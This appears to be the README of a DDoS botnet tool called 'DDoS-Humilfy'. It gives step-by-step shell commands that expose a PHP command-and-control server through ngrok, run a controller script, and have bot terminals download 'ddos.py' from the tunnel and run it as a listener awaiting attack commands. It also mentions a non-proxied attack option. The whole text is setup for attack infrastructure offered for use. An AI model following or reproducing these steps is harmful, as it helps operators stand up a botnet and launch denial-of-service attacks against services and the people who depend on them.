# How to use

---
## Setup botnet remote (Main terminal)
``` bash
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
ngrok ngrok config add-authtoken <token>
php -S 127.0.0.1:8080 | ngrok http 8080 # In DDoS-Humilfy directory
```
---
---
```bash
# On another session in main terminal
python3 remote.py
```
- Now, once you successfully run the remote program type this:
```bash
set-kkey
KKey-cjs: https://<ngrok link>/command.json
KKey-cph: https://<ngrok link>/command.php
KKey-aph: https://<ngrok link>/accepted.php
```
---


---
## Setup botnet receiver (In another terminal/Botnet)
- You need another terminal for your botnet.
``` bash
wget https://<ngrok link>/ddos.py
python3 ddos.py --listener # Use --no-proxy if you want to launch non-proxied DDoS attack
```
---
---
## Input
``` python
[~] Command host: https://<ngrok link>/command.json
[~] Accept host: https://<ngrok link>/accepted.php
[+] Waiting for commands..
```
---
